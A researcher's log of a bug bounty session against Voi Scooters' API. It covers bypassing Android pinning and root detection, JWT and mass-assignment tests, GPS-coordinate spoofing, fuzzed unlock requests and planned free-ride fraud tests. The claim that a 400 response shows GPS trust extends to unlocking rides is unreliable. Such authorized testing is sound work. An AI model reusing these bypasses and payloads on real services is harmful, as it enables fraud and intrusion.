


[[Last commands to make it work]]

[[Commands to make frida work]]


# Voi Scooters Bug Bounty — Complete Session Documentation

**Target:** Voi Scooters (`api.voiapp.io`) on Intigriti  
**Duration:** Multi-day session  
**Platform:** Kubuntu 26 (Host)  
**Goal:** Discover IDOR, Business Logic Flaws, GPS Spoofing, and other vulnerabilities

---

## 1. Platform & Program Selection

### Why Intigriti?

- Starting point: research into low-competition bug bounty programs vs. saturated platforms (HackerOne, Bugcrowd for Google, Meta, Uber)
- Strategy adopted: target "unsexy" industries with lower researcher saturation, sort by newest programs, avoid over-automated scan targets
- Intigriti chosen specifically for being Europe-focused, beginner-friendlier triage, and thinner researcher pools compared to the big US-centric platforms

### Why Voi Scooters?

- Mobility/scooter company — core business is not software, so security maturity is typically lower
- Program showed `< 2 days` since last submission = actively monitored
- `< 2 weeks` first response time — acceptable for testing
- 41 accepted bugs historically, ~61 researchers = healthy, not oversaturated ratio
- Tier 1 payout targets: `api.voiapp.io`, `fm.voiapp.io`, `mds.voiapp.io` (up to €3,500)
- Program explicitly lists "customer data leaks" and "cross-tenant data leaks" as priority — direct alignment with IDOR testing

### Intigriti Account Setup

- Created account at `app.intigriti.com` under username `devyanshunegi`
- Received `@intigriti.me` test email for registrations
- All test requests required custom header: `X-Intigriti: devyanshunegi`
- Rate limit rule from program: max **5 requests/second**

---

## 2. Initial Setup & Burp Suite Configuration on Kubuntu

### Burp Suite Installation

- Downloaded Burp Suite Community from `portswigger.net/burp/communitydownload`
- Installed Java dependency: `sudo apt install default-jre`
- Key configuration:
    - Proxy listener changed from `127.0.0.1:8080` to `0.0.0.0:8080` (all interfaces) to accept phone traffic
    - **Match & Replace rule** added: blank Match field + `X-Intigriti: devyanshunegi` in Replace = auto-injects researcher header on every request
    - **Scope** set to `.*\.voiapp\.io` via regex
    - HTTP History filter: "Show only in-scope items", hide CSS/images/scripts, keep JSON
    - Intruder Resource Pool configured: 1 concurrent request, 250ms delay = 4 req/sec (safely under 5 req/sec limit)

### scrcpy Setup

- Installed: `sudo apt install scrcpy adb`
- Used for Android device screen mirroring to laptop

---

## 3. Mobile App Interception — The Multi-Stage Battle

This is the most significant technical section. What looked like a simple "set proxy and intercept" task turned into a multi-day fight against layered Android security. Each layer required a different bypass technique.

### Stage 1: Basic Proxy + CA Certificate (Naive Approach)

**Attempt:**  
Set Android Wi-Fi manual proxy → `192.168.1.8:8080`. Download Burp CA cert at `http://192.168.1.8:8080`, install on Android.

**Result:**  
`chrome://` loaded but the Voi app gave no traffic — or worse, certificate errors.

**Why it failed:**  
Android 7+ (Nougat) fundamentally changed trust behavior. User-installed CA certs are only trusted by apps that explicitly opt in via `network_security_config.xml`. Most production apps use `<debug-overrides>` which only works in debug builds. The Voi Play Store APK is a release build → user cert ignored.

---

### Stage 2: APK Static Patching (network_security_config modification)

**What we tried:**  
Decompile the Voi APK with `apktool`, modify `res/xml/network_security_config.xml` from:

```xml
<debug-overrides>
  <trust-anchors><certificates src="user"/></trust-anchors>
</debug-overrides>
```

to:

```xml
<base-config cleartextTrafficPermitted="true">
  <trust-anchors>
    <certificates src="system"/>
    <certificates src="user"/>
  </trust-anchors>
</base-config>
```

Recompile → sign with custom keystore → install.

**The Split APK Discovery:**  
Voi uses App Bundles (split APKs), not a single APK. Running `adb shell pm path io.voiapp.voi` revealed three components:

- `base.apk`
- `split_config.arm64_v8a.apk`
- `split_config.xxhdpi.apk`

Installing just one patched APK gave: `INSTALL_FAILED_MISSING_SPLIT`

**Signing Problem:**  
When you patch `base.apk` and resign with a custom keystore, Android detects a signature mismatch against the untouched split APKs and rejects the install. Required tool: **uber-apk-signer** with `--allowResign` flag to strip and re-sign all splits with the same key.

**Login failures on patched APK:**  
Even after installing the patched split APKs successfully:

- **Google OAuth** failed — Google Play Services checks the APK's cryptographic signature during OAuth. Custom signature = blocked silently with `DEVELOPER_ERROR`
- **Phone OTP** failed — initial hypothesis was SSL pinning still blocking OTP requests. Later analysis of Burp logs showed 200 OK responses on `/v2/auth/verify/phone` and a 400 Bad Request on `/v2/auth/verify/code` with error: `{"errors":[{"code":"ErrVerifyEntryNotFound","detail":"entry not found"}]}`. **True cause:** Voi's backend geoblocks Indian `+91` numbers and European telecom numbers that are flagged as VoIP/burner. The SMS was never dispatched; the backend never created a valid verification entry.

---

### Stage 3: android-unpinner by mitmproxy (Frida Gadget Injection)

**Tool:** `pip3 install git+https://github.com/mitmproxy/android-unpinner`

**What it does differently:** Takes the original APK, injects a Frida gadget into it, handles the split APK reinstall natively with `adb install-multiple`, and runs unpinning scripts at runtime — **without changing the visible APK signature in a way Google blocks** for map/vehicle endpoints, though OAuth still fails.

**Steps executed:**

```bash
android-unpinner get-apks io.voiapp.voi
android-unpinner all base.apk split_config.arm64_v8a.apk split_config.xxhdpi.apk
```

Active Frida scripts confirmed: `hide-debugger.js`, `httptoolkit-unpinner.js`

**Result:** HTTP Toolkit started receiving traffic (`200 OK` responses from `api.voiapp.io`). Confirmed SSL pinning bypassed for the main API endpoints.

**Remaining problem:** Google OAuth still blocked (signature changed by the tool). Phone OTP still geoblocked.

**Lesson learned:** android-unpinner is excellent for traffic capture but cannot fix authentication flows that rely on the original Play Store signature.

---

### Stage 4: Physical Rooted Device (Samsung Galaxy M32)

**Decision to pivot:** After architecture mismatches (x86_64 Waydroid vs ARM64 APK) and continued OAuth issues, switched to a physical Samsung Galaxy M32 running ARM64 natively.

**Constraint:** Broken top screen (only 20% visibility), functional bottom touch digitizer.

**Rooting process (summary):**

1. Used `scrcpy` to mirror and control phone from Kubuntu
2. Enabled Developer Options and USB Debugging via touch-bottom navigation
3. Unlocked OEM bootloader (entered Download Mode via hardware buttons)
4. Downloaded correct AP firmware, patched boot image with Magisk using Odin4 for Linux (Linux-native flashing tool)
5. **Critical step:** Used `HOME_CSC` instead of standard `CSC` during flash to bypass Samsung's factory wipe failsafe that would have wiped the Magisk patch

**Burp Certificate system-level injection:**  
Android 13 uses EROFS (read-only filesystem), so manual cert push doesn't work. Used **MagiskTrustUserCerts Magisk module** (AlwaysTrustUserCerts.zip) → systemlessly injects Burp CA into trusted root store on reboot.

**Frida setup:**

- Installed `frida-tools` on Kubuntu
- Critical mistake avoided: pushed correct `frida-server-X.X.X-android-arm64` (ARM64 binary), NOT the x86_64 version from previous Waydroid setup
- **Version mismatch issue:** frida-ps -U failed until Kubuntu frida-tools version matched server binary version exactly (17.9.7)

**Root detection bypass (The Final Boss):**  
Even with Magisk DenyList hiding the main app, the Voi app kept detecting root and killing network connections. Investigation revealed the SDK `io.voiapp.voi:onfido_process` (Onfido identity verification) runs in a **separate isolated sub-process** and was NOT included in the Zygisk DenyList. This sub-process detected Magisk and acted as a kill-switch.

Fix: Added `io.voiapp.voi:onfido_process` and `Google Play Services` to Zygisk DenyList → reboot → root fully hidden.

**VPN for proxy-unaware traffic:**  
Even after all SSL pinning was bypassed, Voi's app was still proxy-unaware (ignores OS-level proxy settings). Deployed **SuperProxy APK** to create a local VPN tunnel, forcing all device network traffic through Burp regardless of the app's internal socket configuration.

**Final state achieved:** Live `api.voiapp.io` requests populating Burp Suite HTTP History in real-time.

---

## 4. Voi Application Architecture (Discovered Through Dynamic Analysis)

Everything below was discovered purely through **dynamic analysis** — observing live decrypted traffic in Burp. No decompilation or static analysis required.

### API Domain Structure

|Domain|Tier|Purpose|
|---|---|---|
|`api.voiapp.io`|Tier 1|Main REST API (highest payout)|
|`fm.voiapp.io`|Tier 1|Fleet Management|
|`mds.voiapp.io`|Tier 1|Partner/MDS API|
|`*.voi.com`|Tier 3|Informational website (low value)|

### API Gateway Pattern

Voi uses a **Backend-for-Frontend (BFF) architecture** with an edge gateway:

- `/edge/` prefix = Edge Gateway layer (e.g., `POST /edge/rentals/start`, `GET /edge/rentals/active`)
- `/v1/`, `/v2/`, `/v3/`, `/v4/` versioned endpoints for core services
- Likely uses AWS API Gateway or similar, routing to internal microservices for billing, IoT control, inventory

### Versioned Endpoint Examples Observed

```
GET  /v1/user
POST /v1/user
GET  /v1/users/wallet
GET  /v1/users/personal/features
GET  /v1/rides/state
GET  /v1/rides/zones/{zone_id}/areas
GET  /v1/rides/zone-at?location=...
GET  /v1/meta/version_check
POST /v1/app-session/check-in
GET  /v1/gateway/zone-centers
GET  /v1/gateway/bff/ride-mode
PUT  /v1/gateway/bff/ride-mode
GET  /v1/payments/braintree/client-token
POST /v1/payments/braintree/device-data
POST /v1/payments/braintree-card/init-setup
POST /v1/payments/braintree-google-pay/init-setup
POST /v1/chatbot/kindly/token
GET  /v1/user-profiles/checklist
GET  /v1/identity-check/age-restriction
GET  /v1/content-card/prioritized
GET  /v1/rides/state
GET  /v2/rides/vehicles            ← scooter locations
GET  /v2/payments/profiles
GET  /v2/payments/layout/{zone}/product-page
GET  /v2/referral/info
GET  /v2/discounts
GET  /v2/profile/rideconfig
GET  /v2/identity-check/content-card/prioritized
POST /v3/payments/primer/token
GET  /v3/payments/rides/ride-plans
GET  /v4/payments/debt
GET  /edge/rentals/active
POST /edge/rentals/start           ← THE UNLOCK ENDPOINT
```

### Authentication Architecture — Dual Token System

**Two tokens used on every sensitive request:**

**Token 1: X-Access-Token (JWT, ES256 algorithm)**  
Decoded payload example:

```json
{
  "exp": 1778278039,
  "iss": "auth.api.voiapp.io",
  "userId": "b7326cc4-1cb1-44f9-85e9-47b25cd3f4e1",
  "UserID": "b7326cc4-1cb1-44f9-85e9-47b25cd3f4e1",
  "loginProvider": 0,
  "sessionId": "05036...",
  "role": {"global": ["rider"], "zone": null},
  "appSessionId": "12cd2d..."
}
```

- Signed with `ES256` (Elliptic Curve, kid-referenced key)
- Short-lived (~15 minutes)

**Token 2: X-Precheck-Token (JWT, ES256 algorithm)**  
Decoded payload example:

```json
{
  "sub": "b7326cc4-1cb1-44f9-85e9-47b25cd3f4e1",
  "z": "353",
  "d": "331c1bfbafe9a458",    ← Device ID (ties token to device)
  "p": "Android",
  "v": "3.336.0",
  "c": "264974271",
  "iat": ..., "exp": ...
}
```

- Critical security detail: the `d` (device_id) field in X-Precheck-Token matches the `X-Device-Id` header — cryptographically tying each session to a specific physical device

**Security implication:** This dual-token + device binding means simple session token theft is insufficient for attack — an attacker needs both tokens AND the matching device ID.

**Chatbot Token (JWT, RS256):**  
`POST /v1/chatbot/kindly/token` generates a third JWT for the Kindly.ai customer support chatbot integration. This token leaks PII in cleartext in the HTTP response's `context` field:

```json
{
  "userId": "b7326...",
  "userEmail": "xapeme4010@badgerhole.com",
  "userCountry": "SE",
  "userName": "new name"
}
```

### Payment Stack

- **Braintree (PayPal)** for card and Google Pay processing
- **Primer** for alternative payment methods (`POST /v3/payments/primer/token`)
- Payment initialization returns a large client token (3,000+ bytes)
- Braintree SDK itself uses strict SSL pinning, causing app crashes when intercepted (separate from Voi's pinning)

### Third-Party Integrations

- **Kindly.ai** (`bot.kindly.ai`) — customer support chatbot
- **Mapbox** (`api.mapbox.com`) — map tiles and routing
- **Braze** (`sdk.fra-01.braze.eu`) — marketing analytics
- **Adjust** (`app.adjust.com`) — mobile attribution
- **Datadog** (`datadoghq`) — crash reporting/monitoring
- **Onfido** (`io.voiapp.voi:onfido_process`) — identity verification SDK

---

## 5. Attack Attempts & Findings

### 5.1 IDOR Testing — Why It Failed

**Standard approach:** Find endpoints with IDs → swap the ID → check if server returns another user's data.

**What we found:** Voi uses **cryptographic identity extraction** on the backend. The server completely ignores any `userId` parameter provided in the request body or URL. Instead, it decodes the signed JWT from `X-Access-Token`, extracts the `userId` claim from the cryptographically verified payload, and queries the database using that — never trusting the client.

**Test performed:**

```
POST /v1/chatbot/kindly/token
Body: {"chatId":"...","userId":"b7326cc4-...e2","voi_language":"en"}
```

Changed last character of UUID from `e1` to `e2`. Response returned our own data unchanged — server ignored the injected `userId`.

**Profile update test:**

```
POST /v1/user
Body: {"name":"hacked name"}
```

Response confirmed: `"id":"b7326cc4-...e1"` — our original ID, not the one we injected.

**JWT "None" Algorithm Attack:**  
Constructed a forged JWT with `{"alg":"none"}` and modified `userId` to a different UUID. Result: `HTTP 401 Unauthorized`. The backend properly validates ES256 cryptographic signatures.

**Hidden endpoint test:**

```
PUT /v1/users/b7326cc4-...-e2
Body: {"name":"hacked via hidden endpoint"}
```

Result: `HTTP 404 Not Found` — endpoint doesn't exist.

**Mass assignment test:**

```
POST /v1/user
Body: {"isBlocked":false,"roles":{"global":["admin"]},"hasAtleastOnePaidRide":true}
```

Response: `HTTP 200 OK` but server returned `"hasAtleastOnePaidRide":false` — the whitelisted field approach blocked mass assignment. Backend ignored all privileged fields.

**Conclusion on IDOR:** Voi's backend is secure against standard IDOR attacks on user-owned resources. They employ a zero-trust model for client-provided identity parameters.

---

### 5.2 GPS Spoofing — The Critical Finding ✓

**Discovery:** The scooter location endpoint accepts client-provided GPS coordinates:

```
GET /v2/rides/vehicles?zone_id=353&include_suggestion=false&user_location=29.7781748%2C78.4445569
```

**Baseline:** With Indian coordinates (`29.77°N, 78.44°E`), response was:

```json
{"data":{"vehicle_groups":[]}}
```

(No scooters — Voi doesn't operate in India)

**The Attack:** Modified the request in Burp Repeater:

```
GET /v2/rides/vehicles?zone_id=1&include_suggestion=false&user_location=59.3293%2C18.0686
```

(Stockholm, Sweden coordinates)

**Result:** `HTTP 200 OK` — response ballooned from 30 bytes to **hundreds of kilobytes**. The server returned GPS coordinates, battery levels, lock status, and UUIDs for ~500+ live scooters currently sitting on Stockholm streets.

The server is **blindly trusting client-supplied GPS** without any IP-based geolocation validation.

**Why this is critical:**  
This vulnerability enables:

1. **Free Ride Fraud:** Spoof coordinates to a promotional "Free Zone" when starting a ride, pay nothing while physically in a paid zone
2. **Geofence Bypass:** Unlock scooters geofenced to restricted areas (corporate campuses, event zones) from anywhere in the world
3. **Fleet Reconnaissance:** Enumerate exact locations and battery levels of every active scooter fleet globally

---

### 5.3 The Unlock Endpoint Hunt

**Goal:** Find `POST /edge/rentals/start` (or equivalent) to prove GPS spoofing extends to actual ride initiation.

**Discovery method:** Blind fuzzing a list of candidate endpoints, looking for non-404 status codes.

**Endpoints that returned 404 (don't exist):**

- `POST /v1/rides/start`
- `POST /v1/vehicles/{id}/unlock`
- `PUT /v1/users/{id}`

**The breakthrough:** `POST /edge/rentals/start` returned `HTTP 400 Bad Request {}` — not 404. This means the endpoint exists and is listening, but our JSON payload structure was wrong.

**Fuzzing the payload structure (all returned 400):**

```json
{"vehicle_id": "e721196a...", "lat": 59.308601, "lng": 18.082501, "zone_id": "1"}
{"code": "4ebs", "lat": 59.308601, "lng": 18.082501}
{"vehicle": {"id": "e721196a..."}, "location": {"lat": 59.308601, "lng": 18.082501}}
{"rental": {"vehicle_id": "e721196a..."}, "zone_id": 1}
{"short_id": "4ebs", "lat": 59.308601, "lng": 18.082501}
{"scooter_id": "4ebs", "action": "start"}
```

**Blocker:** Couldn't complete the ride setup (payment method couldn't be attached — Braintree SDK crashes when intercepted). Without a completed profile, the app's UI blocks showing the QR scan button, and we couldn't observe the exact native payload format organically.

**Status:** Endpoint confirmed to exist. Exact JSON schema not yet recovered. Requires either: (a) completing payment setup, or (b) capturing the native unlock request from the emulator/device after bypassing the profile completion block.

---

### 5.4 JWT-Specific Tests

**Chatbot token endpoint parameter injection:**  
`POST /v1/chatbot/kindly/token` accepts `chatId`, `voi_language`, `timezone`, `zoneId`. We injected `userId` into the body — server ignored it and used the JWT-authenticated identity instead. Endpoint is secure against parameter injection.

**PII Disclosure observation:**  
The chatbot token response `context` object leaks user email, country, and name in cleartext JSON alongside the signed JWT. Not a direct exploit but noteworthy data exposure in API responses.

---

## 6. Waydroid Interlude (Alternative Setup Attempt)

Between physical device sessions, spent significant time attempting to use Waydroid (Android container on Linux) as a faster alternative. Key learnings:

- **Architecture mismatch:** Waydroid on Intel x86_64 + ARM64-only APKs = `INSTALL_FAILED_NO_MATCHING_ABIS`. Fix: install libhoudini ARM translation layer via `casualsnek/waydroid_script`
- **Wi-Fi UI doesn't work** in Waydroid — must set proxy via `adb shell settings put global http_proxy 192.168.240.1:8080` or use SuperProxy APK
- **Captive portal kills internet** when proxy active — fix: `settings put global captive_portal_mode 0`
- **Certificate injection** requires tmpfs bind-mount trick since `/system` is read-only:
    
    ```bash
    mount -t tmpfs tmpfs /system/etc/security/cacertsmount -o bind /data/local/tmp/certs /system/etc/security/cacertschcon -R u:object_r:system_file:s0 /system/etc/security/cacerts
    ```
    
- **ADB authorization** requires manually pushing host public key (`~/.android/adbkey.pub`) into `/data/misc/adb/adb_keys` inside the container
- **Final verdict:** Waydroid is excellent for speed but has too many layered networking and filesystem quirks for heavy-duty mobile app interception. Physical rooted device is more reliable for production security research.

---

## 7. Key Technical Concepts Discovered

### Android Security Layers (from outer to inner)

1. **OS-level proxy trust** — bypassed by android-unpinner / Frida gadget injection
2. **Certificate pinning** — bypassed by Frida + akabe1/frida-multiple-unpinning
3. **Root detection (app-level)** — bypassed by Magisk + Zygisk DenyList
4. **Root detection (SDK sub-process)** — bypassed by adding `onfido_process` to DenyList separately
5. **Proxy-unaware networking** — bypassed by SuperProxy VPN tunnel

### IDOR Defense Pattern (Modern Approach)

Old-style APIs: client sends `?userId=123` → server trusts it  
Voi's approach: client sends JWT → server decodes and extracts userId cryptographically → ignores all client-side ID parameters

### Split APK / App Bundle Security

- Modifying `base.apk` alone breaks install due to missing splits
- Re-signing all splits is possible but breaks Google OAuth signature checks
- Frida dynamic instrumentation is the cleanest bypass — leaves disk files unmodified

### JWT ES256 vs RS256

- `X-Access-Token` and `X-Precheck-Token` use **ES256** (Elliptic Curve) — harder to forge than HMAC
- Chatbot token uses **RS256** (RSA)
- `alg:none` attack failed — server properly validates signatures

---

## 8. Tools Used (Full Stack)

|Tool|Purpose|
|---|---|
|Burp Suite Community|HTTP proxy, Repeater, Intruder|
|Frida (frida-tools 17.9.7)|Runtime instrumentation, SSL unpinning|
|frida-multiple-unpinning|Frida Codeshare script for hook injection|
|android-unpinner (mitmproxy)|APK patching + Frida gadget injection|
|apktool|APK decompilation/recompilation|
|uber-apk-signer|Batch-signing split APKs|
|adb|Device communication|
|scrcpy|Phone screen mirroring to laptop|
|Magisk|Root management|
|Zygisk DenyList|Per-process root hiding|
|AlwaysTrustUserCerts.zip|Magisk module for system-level cert trust|
|SuperProxy|VPN-based traffic forcing|
|HTTP Toolkit|Alternative proxy (used early, replaced by Burp)|
|Odin4 (Linux)|Samsung firmware flashing|
|Waydroid|Android container on Linux (used, then abandoned)|
|jwt.io|JWT decoding and analysis|

---

## 9. Interview Talking Points

**"Walk me through your methodology for intercepting a modern Android app."**  
Mention the escalation: naive proxy → static APK patching (network_security_config) → dynamic instrumentation (Frida) → root-detection bypass (Zygisk per-process hiding). Emphasize that each layer taught you something about how modern Android security is architected.

**"What's the difference between a proxy-unaware app and SSL pinning?"**  
Proxy-unaware = app uses low-level sockets, ignoring OS proxy settings (fixed by VPN tunnel at network layer). SSL pinning = app rejects your CA cert regardless of OS trust (fixed by hooking TLS functions in memory via Frida).

**"How did you bypass root detection?"**  
The key was discovering that a third-party SDK sub-process (`onfido_process`) ran independently of the main app and detected Magisk separately. Zygisk DenyList needs to target each process individually — hiding the main app is not enough.

**"What did you find?"**  
GPS coordinates provided by the client are blindly trusted by `api.voiapp.io`. A request to `GET /v2/rides/vehicles` with Stockholm coordinates from an Indian IP returns full live scooter fleet data — GPS, battery, lock status, UUIDs. The server performs no IP-geolocation cross-check. The `POST /edge/rentals/start` unlock endpoint exists and responds to requests, confirming the GPS trust extends to operational actions.

---

## 10. Next Steps / Open Items

- [ ] Recover exact JSON payload for `POST /edge/rentals/start` by completing profile setup or capturing via native app tap
- [ ] Test GPS spoofing on promotional/free-ride zone coordinates during ride initiation
- [ ] Explore `fm.voiapp.io` and `mds.voiapp.io` (Tier 1, fleet management) — likely cross-tenant issues
- [ ] Test `GET /v2/referral/info` for referral code logic flaws (self-referral, replay)
- [ ] Investigate the `/v1/chatbot/kindly/token` endpoint for CSRF or token reuse across sessions
- [ ] Attempt race condition on promo code application endpoint
- [ ] Read `docs.voi.com` partner API documentation — most researchers skip this

---

_Documented from multi-day bug bounty session. All testing performed on personal authorized Intigriti account under Voi's published program scope._